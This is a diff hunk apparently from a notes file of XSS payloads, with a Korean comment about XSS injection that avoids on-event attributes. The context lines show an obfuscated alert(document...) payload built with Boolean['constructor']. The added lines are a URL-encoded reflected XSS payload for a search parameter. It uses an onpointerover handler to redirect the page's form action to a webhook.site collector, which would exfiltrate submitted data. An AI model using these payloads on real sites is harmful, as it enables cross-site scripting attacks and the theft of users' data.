@@ -29,6 +29,12 @@ Boolean['constructor']('a'+'l'+'e'+'r'+'t'+'('+'d'+'o'+'c'+'u'+'m'+'e'+'n'+'t'+'
 ;window.open("https://naver.com");
 
 
+https://test.com/portal/bbs/example.do?bbsId=1&searchKey=bbsSjNm
+  &searchVal=aaa%22+data-url%3D%2F%2Fwebhook.site%2Fc882d2b7-a486-4528-b5fc-test
+  5116ab5+data-t%3Dsubmit+data-i%3D7+onpointerover%3D%22this.form.action%3Dthis.d
+  ataset.url%3Bthis.form.elements%5Bthis.dataset.i%5D.type%3Dthis.dataset.t%3BfnS
+  earchList%3Dnull
+
 
 # on이벤트= 이 아닌 xss 삽입
 
